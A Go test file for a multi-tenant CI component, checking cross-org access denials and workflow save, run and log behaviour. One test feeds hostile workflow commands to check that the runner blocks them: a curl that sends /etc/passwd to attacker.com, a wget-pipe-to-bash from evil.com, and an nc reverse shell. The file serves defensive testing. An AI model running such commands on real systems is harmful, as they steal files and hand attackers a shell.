package cici_test

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/danielvm/bigbase/components/auth"
	"github.com/danielvm/bigbase/components/cici"
	"github.com/danielvm/bigbase/components/db"
	"github.com/danielvm/bigbase/kernel"
)

type testLogger struct{}

func (testLogger) Info(msg string, args ...any)  {}
func (testLogger) Warn(msg string, args ...any)  {}
func (testLogger) Error(msg string, args ...any) {}
func (testLogger) Debug(msg string, args ...any) {}

func setupCICI(t *testing.T) (*cici.CICI, *db.DB) {
	t.Helper()
	logger := testLogger{}
	k := kernel.New(logger)
	d := db.New(db.Options{Path: ":memory:", Logger: logger})
	c := cici.New(cici.Options{DB: d, Logger: logger})
	k.Register(c)
	k.Register(d)
	if err := k.Start(); err != nil {
		t.Fatalf("kernel start: %v", err)
	}
	// Create git_repos table so ownership checks work
	if err := d.Migrate(`CREATE TABLE IF NOT EXISTS git_repos (
		id TEXT PRIMARY KEY, name TEXT NOT NULL,
		owner_id INTEGER NOT NULL, private INTEGER DEFAULT 1,
		default_branch TEXT DEFAULT 'main', description TEXT DEFAULT '',
		created_at TEXT DEFAULT (datetime('now')))`); err != nil {
		t.Fatalf("create git_repos: %v", err)
	}
	t.Cleanup(func() { _ = k.Stop() })
	return c, d
}

// seedRepo inserts a repo with the given owner_id for ownership tests.
func seedRepo(t *testing.T, d *db.DB, repoID, name string, ownerID int64) {
	t.Helper()
	_, err := d.ExecContext(context.Background(),
		"INSERT OR IGNORE INTO git_repos (id, name, owner_id) VALUES (?, ?, ?)",
		repoID, name, ownerID)
	if err != nil {
		t.Fatalf("seed repo %s: %v", repoID, err)
	}
}

// withOrgID wraps an http.Request with the given org_id in its context.
func withOrgID(r *http.Request, orgID int64) *http.Request {
	return r.WithContext(auth.WithOrgID(r.Context(), orgID))
}

func TestCICIImplementsComponent(t *testing.T) {
	var _ kernel.Component = &cici.CICI{}
}

func TestCICIName(t *testing.T) {
	c := &cici.CICI{}
	if got := c.Name(); got != "cici" {
		t.Fatalf("expected Name()='cici', got '%s'", got)
	}
}

func TestCICISaveWorkflowCrossTenantRejected(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "repo-a", "org-a-app", 100)

	// Org-B user (org_id=200) tries to save a workflow on org-A's repo
	body, _ := json.Marshal(map[string]string{"name": "Evil", "yaml": "name: Evil\non: [push]\njobs:\n  x:\n    steps:\n      - run: echo pwned\n"})
	req := httptest.NewRequest("PUT", "/api/cici/repo-a/workflows", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req = withOrgID(req, 200)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCICITriggerRunCrossTenantRejected(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "repo-a", "org-a-app", 100)

	// Org-A user creates a workflow
	wfYAML := "name: CI\non: [push]\njobs:\n  build:\n    steps:\n      - run: echo ok\n"
	body, _ := json.Marshal(map[string]string{"name": "CI", "yaml": wfYAML})
	req := httptest.NewRequest("PUT", "/api/cici/repo-a/workflows", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req = withOrgID(req, 100)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	var resp map[string]any
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatal(err)
	}
	wfID, _ := resp["id"].(string)

	// Org-B user tries to trigger the workflow
	runBody, _ := json.Marshal(map[string]string{"event": "manual"})
	runReq := httptest.NewRequest("POST", "/api/cici/repo-a/workflows/"+wfID+"/run", bytes.NewReader(runBody))
	runReq.Header.Set("Content-Type", "application/json")
	runReq = withOrgID(runReq, 200)
	runW := httptest.NewRecorder()
	h.ServeHTTP(runW, runReq)

	if runW.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", runW.Code, runW.Body.String())
	}
}

func TestCICIListWorkflowsScopedByOrg(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "repo-a", "org-a-app", 100)
	seedRepo(t, d, "repo-b", "org-b-app", 200)

	wfYAML := "name: Test\non: [push]\njobs:\n  t:\n    steps:\n      - run: echo ok\n"

	// Org-A creates workflow on repo-a
	body1, _ := json.Marshal(map[string]string{"name": "WF-A", "yaml": wfYAML})
	r1 := httptest.NewRequest("PUT", "/api/cici/repo-a/workflows", bytes.NewReader(body1))
	r1.Header.Set("Content-Type", "application/json")
	r1 = withOrgID(r1, 100)
	w1 := httptest.NewRecorder()
	h.ServeHTTP(w1, r1)

	// Org-B creates workflow on repo-b
	body2, _ := json.Marshal(map[string]string{"name": "WF-B", "yaml": wfYAML})
	r2 := httptest.NewRequest("PUT", "/api/cici/repo-b/workflows", bytes.NewReader(body2))
	r2.Header.Set("Content-Type", "application/json")
	r2 = withOrgID(r2, 200)
	w2 := httptest.NewRecorder()
	h.ServeHTTP(w2, r2)

	// Org-A should only see repo-a workflows
	listReq := httptest.NewRequest("GET", "/api/cici/repo-a/workflows", nil)
	listReq = withOrgID(listReq, 100)
	listW := httptest.NewRecorder()
	h.ServeHTTP(listW, listReq)

	var resp map[string][]map[string]any
	if err := json.NewDecoder(listW.Body).Decode(&resp); err != nil {
		t.Fatal(err)
	}
	if len(resp["data"]) != 1 {
		t.Fatalf("expected 1 workflow for org-a, got %d", len(resp["data"]))
	}
	if resp["data"][0]["name"] != "WF-A" {
		t.Fatalf("expected WF-A, got %v", resp["data"][0]["name"])
	}

	// Org-B should not be able to list repo-a workflows
	crossReq := httptest.NewRequest("GET", "/api/cici/repo-a/workflows", nil)
	crossReq = withOrgID(crossReq, 200)
	crossW := httptest.NewRecorder()
	h.ServeHTTP(crossW, crossReq)

	if crossW.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", crossW.Code, crossW.Body.String())
	}
}

func TestCICIGetRunLogsCrossTenantRejected(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "repo-a", "org-a-app", 100)

	// Org-A creates and runs a workflow
	wfYAML := "name: CI\non: [push]\njobs:\n  build:\n    steps:\n      - run: echo hello\n"
	wfID := saveWorkflow(t, h, "repo-a", "CI", wfYAML, 100)

	runBody, _ := json.Marshal(map[string]string{"event": "manual"})
	runReq := httptest.NewRequest("POST", "/api/cici/repo-a/workflows/"+wfID+"/run", bytes.NewReader(runBody))
	runReq.Header.Set("Content-Type", "application/json")
	runReq = withOrgID(runReq, 100)
	runW := httptest.NewRecorder()
	h.ServeHTTP(runW, runReq)

	var run map[string]any
	if err := json.NewDecoder(runW.Body).Decode(&run); err != nil {
		t.Fatal(err)
	}
	runID, _ := run["id"].(string)

	pollForStatus(t, h, runID, "success")

	// Org-B tries to read the logs
	logReq := httptest.NewRequest("GET", "/api/cici/runs/"+runID+"/logs", nil)
	logReq = withOrgID(logReq, 200)
	logW := httptest.NewRecorder()
	h.ServeHTTP(logW, logReq)

	if logW.Code != http.StatusForbidden {
		t.Fatalf("expected 403, got %d: %s", logW.Code, logW.Body.String())
	}
}

func TestCICIListRunsScopedByOrg(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "repo-a", "org-a-app", 100)
	seedRepo(t, d, "repo-b", "org-b-app", 200)

	wfYAML := "name: CI\non: [push]\njobs:\n  build:\n    steps:\n      - run: echo ok\n"

	// Org-A creates and runs a workflow
	wfID1 := saveWorkflow(t, h, "repo-a", "CI-A", wfYAML, 100)
	runBody1, _ := json.Marshal(map[string]string{"event": "manual"})
	runReq1 := httptest.NewRequest("POST", "/api/cici/repo-a/workflows/"+wfID1+"/run", bytes.NewReader(runBody1))
	runReq1.Header.Set("Content-Type", "application/json")
	runReq1 = withOrgID(runReq1, 100)
	runW1 := httptest.NewRecorder()
	h.ServeHTTP(runW1, runReq1)

	var run1 map[string]any
	if err := json.NewDecoder(runW1.Body).Decode(&run1); err != nil {
		t.Fatal(err)
	}
	pollForStatus(t, h, run1["id"].(string), "success")

	// Org-B creates and runs a workflow
	wfID2 := saveWorkflow(t, h, "repo-b", "CI-B", wfYAML, 200)
	runBody2, _ := json.Marshal(map[string]string{"event": "manual"})
	runReq2 := httptest.NewRequest("POST", "/api/cici/repo-b/workflows/"+wfID2+"/run", bytes.NewReader(runBody2))
	runReq2.Header.Set("Content-Type", "application/json")
	runReq2 = withOrgID(runReq2, 200)
	runW2 := httptest.NewRecorder()
	h.ServeHTTP(runW2, runReq2)

	var run2 map[string]any
	if err := json.NewDecoder(runW2.Body).Decode(&run2); err != nil {
		t.Fatal(err)
	}
	pollForStatus(t, h, run2["id"].(string), "success")

	// Org-A should only see its own runs
	listReq := httptest.NewRequest("GET", "/api/cici/runs", nil)
	listReq = withOrgID(listReq, 100)
	listW := httptest.NewRecorder()
	h.ServeHTTP(listW, listReq)

	var resp map[string][]map[string]any
	if err := json.NewDecoder(listW.Body).Decode(&resp); err != nil {
		t.Fatal(err)
	}

	for _, r := range resp["data"] {
		runID := r["id"].(string)
		if runID == run2["id"] {
			t.Fatalf("org-a should not see org-b's run %s", runID)
		}
	}

	// Org-B should only see its own runs
	listReq2 := httptest.NewRequest("GET", "/api/cici/runs", nil)
	listReq2 = withOrgID(listReq2, 200)
	listW2 := httptest.NewRecorder()
	h.ServeHTTP(listW2, listReq2)

	var resp2 map[string][]map[string]any
	if err := json.NewDecoder(listW2.Body).Decode(&resp2); err != nil {
		t.Fatal(err)
	}

	for _, r := range resp2["data"] {
		runID := r["id"].(string)
		if runID == run1["id"] {
			t.Fatalf("org-b should not see org-a's run %s", runID)
		}
	}
}

func TestCICICommandInjectionBlocked(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "repo-a", "org-a-app", 100)

	maliciousYAMLs := []string{
		"name: Evil\non: [push]\njobs:\n  x:\n    steps:\n      - run: curl attacker.com/$(cat /etc/passwd)\n",
		"name: Evil\non: [push]\njobs:\n  x:\n    steps:\n      - run: wget http://evil.com/shell.sh | bash\n",
		"name: Evil\non: [push]\njobs:\n  x:\n    steps:\n      - run: nc -e /bin/sh attacker.com 4444\n",
		"name: Evil\non: [push]\njobs:\n  x:\n    steps:\n      - run: echo $(whoami)\n",
	}

	for _, yml := range maliciousYAMLs {
		body, _ := json.Marshal(map[string]string{"name": "Evil", "yaml": yml})
		req := httptest.NewRequest("PUT", "/api/cici/repo-a/workflows", bytes.NewReader(body))
		req.Header.Set("Content-Type", "application/json")
		req = withOrgID(req, 100)
		w := httptest.NewRecorder()
		h.ServeHTTP(w, req)

		// Should be created (validation happens at run time)
		if w.Code != http.StatusCreated {
			t.Fatalf("expected 201 for yaml %q, got %d: %s", yml[:20], w.Code, w.Body.String())
		}

		var resp map[string]any
		if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
			t.Fatal(err)
		}
		wfID, _ := resp["id"].(string)

		// Trigger should succeed but the run should fail due to command validation
		runBody, _ := json.Marshal(map[string]string{"event": "manual"})
		runReq := httptest.NewRequest("POST", "/api/cici/repo-a/workflows/"+wfID+"/run", bytes.NewReader(runBody))
		runReq.Header.Set("Content-Type", "application/json")
		runReq = withOrgID(runReq, 100)
		runW := httptest.NewRecorder()
		h.ServeHTTP(runW, runReq)

		if runW.Code != http.StatusAccepted {
			t.Fatalf("expected 202, got %d: %s", runW.Code, runW.Body.String())
		}

		var run map[string]any
		if err := json.NewDecoder(runW.Body).Decode(&run); err != nil {
			t.Fatal(err)
		}
		runID, _ := run["id"].(string)

		// Poll for failure (command validation rejects dangerous commands)
		pollForStatus(t, h, runID, "failure")
	}
}

func saveWorkflow(t *testing.T, h http.Handler, repoID, name, yaml string, orgID int64) string {
	t.Helper()
	body, _ := json.Marshal(map[string]string{
		"repo_id": repoID, "name": name, "yaml": yaml,
	})
	req := httptest.NewRequest("PUT", "/api/cici/"+repoID+"/workflows", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req = withOrgID(req, orgID)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)
	if w.Code != http.StatusCreated {
		t.Fatalf("save workflow: expected 201, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string]any
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatal(err)
	}
	id, _ := resp["id"].(string)
	if id == "" {
		t.Fatalf("expected non-empty id, got: %v", resp)
	}
	return id
}

func TestCICISaveAndListWorkflows(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "repo1", "my-app", 100)

	workflowYAML := `name: Test
on: [push]
jobs:
  test:
    runs-on: self-hosted
    steps:
      - run: echo "hello"
`
	saveWorkflow(t, h, "repo1", "Test", workflowYAML, 100)

	getReq := httptest.NewRequest("GET", "/api/cici/repo1/workflows", nil)
	getReq = withOrgID(getReq, 100)
	getW := httptest.NewRecorder()
	h.ServeHTTP(getW, getReq)

	if getW.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", getW.Code, getW.Body.String())
	}

	var resp map[string][]map[string]any
	if err := json.NewDecoder(getW.Body).Decode(&resp); err != nil {
		t.Fatal(err)
	}
	if len(resp["data"]) != 1 {
		t.Fatalf("expected 1 workflow, got %d", len(resp["data"]))
	}
	if resp["data"][0]["name"] != "Test" {
		t.Fatalf("expected name 'Test', got %v", resp["data"][0]["name"])
	}
}

func TestCICITriggerRun(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "r", "my-app", 100)

	wfID := saveWorkflow(t, h, "r", "CI", `name: CI
on: [push]
jobs:
  build:
    steps:
      - run: echo "ok"
`, 100)
	runBody, _ := json.Marshal(map[string]string{"event": "manual"})
	runReq := httptest.NewRequest("POST", "/api/cici/r/workflows/"+wfID+"/run", bytes.NewReader(runBody))
	runReq.Header.Set("Content-Type", "application/json")
	runReq = withOrgID(runReq, 100)
	runW := httptest.NewRecorder()
	h.ServeHTTP(runW, runReq)

	if runW.Code != http.StatusAccepted {
		t.Fatalf("expected 202, got %d: %s", runW.Code, runW.Body.String())
	}

	var run map[string]any
	if err := json.NewDecoder(runW.Body).Decode(&run); err != nil {
		t.Fatal(err)
	}
	if run["status"] != "running" {
		t.Fatalf("expected status 'running', got %v", run["status"])
	}
	if runID, ok := run["id"]; !ok || runID == "" {
		t.Fatalf("expected run id, got: %v", run)
	}

	pollForStatus(t, h, run["id"].(string), "success")
}

func pollForStatus(t *testing.T, h http.Handler, runID, want string) {
	t.Helper()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		listReq := httptest.NewRequest("GET", "/api/cici/runs", nil)
		listW := httptest.NewRecorder()
		h.ServeHTTP(listW, listReq)

		if listW.Code != http.StatusOK {
			t.Fatalf("list runs: %d", listW.Code)
		}
		var listResp map[string][]map[string]any
		if err := json.NewDecoder(listW.Body).Decode(&listResp); err != nil {
			t.Fatal(err)
		}
		for _, r := range listResp["data"] {
			if r["id"] == runID && r["status"] == want {
				return
			}
		}
		time.Sleep(100 * time.Millisecond)
	}
	t.Fatalf("run %s never reached status %s", runID, want)
}

func TestCICIRunLogs(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "r", "my-app", 100)

	wfID := saveWorkflow(t, h, "r", "CI", `name: CI
on: [push]
jobs:
  build:
    steps:
      - run: echo "hello world"
`, 100)
	runBody, _ := json.Marshal(map[string]string{"event": "manual"})
	runReq := httptest.NewRequest("POST", "/api/cici/r/workflows/"+wfID+"/run", bytes.NewReader(runBody))
	runReq.Header.Set("Content-Type", "application/json")
	runReq = withOrgID(runReq, 100)
	runW := httptest.NewRecorder()
	h.ServeHTTP(runW, runReq)

	var run map[string]any
	if err := json.NewDecoder(runW.Body).Decode(&run); err != nil {
		t.Fatal(err)
	}
	runID, _ := run["id"].(string)

	pollForStatus(t, h, runID, "success")

	logReq := httptest.NewRequest("GET", "/api/cici/runs/"+runID+"/logs", nil)
	logReq = withOrgID(logReq, 100)
	logW := httptest.NewRecorder()
	h.ServeHTTP(logW, logReq)

	if logW.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", logW.Code, logW.Body.String())
	}

	var logResp map[string]any
	if err := json.NewDecoder(logW.Body).Decode(&logResp); err != nil {
		t.Fatal(err)
	}
	logs, ok := logResp["logs"].([]any)
	if !ok || len(logs) == 0 {
		t.Fatalf("expected non-empty logs, got: %v", logResp)
	}
}

func TestCICISaveWorkflowMissingName(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "r", "my-app", 100)

	body, _ := json.Marshal(map[string]string{"repo_id": "r", "name": "", "yaml": "name: Test\non: [push]\njobs:\n  t:\n    steps:\n      - run: echo\n"})
	req := httptest.NewRequest("PUT", "/api/cici/r/workflows", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req = withOrgID(req, 100)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCICISaveWorkflowInvalidYAML(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "r", "my-app", 100)

	body, _ := json.Marshal(map[string]string{"repo_id": "r", "name": "Bad", "yaml": "<<<<"})
	req := httptest.NewRequest("PUT", "/api/cici/r/workflows", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req = withOrgID(req, 100)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCICITriggerRunNotFound(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "r", "my-app", 100)

	runBody, _ := json.Marshal(map[string]string{"event": "manual"})
	req := httptest.NewRequest("POST", "/api/cici/r/workflows/nonexistent/run", bytes.NewReader(runBody))
	req.Header.Set("Content-Type", "application/json")
	req = withOrgID(req, 100)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Fatalf("expected 404, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCICIRunsMethodNotAllowed(t *testing.T) {
	c, _ := setupCICI(t)
	h := c.Handler()

	req := httptest.NewRequest("DELETE", "/api/cici/runs", nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Fatalf("expected 405, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCICIWorkflowsMethodNotAllowed(t *testing.T) {
	c, _ := setupCICI(t)
	h := c.Handler()

	req := httptest.NewRequest("DELETE", "/api/cici/r/workflows", nil)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Fatalf("expected 405, got %d: %s", w.Code, w.Body.String())
	}
}

func TestCICIEmptyRepoWorkflows(t *testing.T) {
	c, d := setupCICI(t)
	h := c.Handler()

	seedRepo(t, d, "empty", "empty-repo", 100)

	req := httptest.NewRequest("GET", "/api/cici/empty/workflows", nil)
	req = withOrgID(req, 100)
	w := httptest.NewRecorder()
	h.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}
	var resp map[string][]map[string]any
	if err := json.NewDecoder(w.Body).Decode(&resp); err != nil {
		t.Fatal(err)
	}
	if len(resp["data"]) != 0 {
		t.Fatalf("expected empty list, got %d items", len(resp["data"]))
	}
}
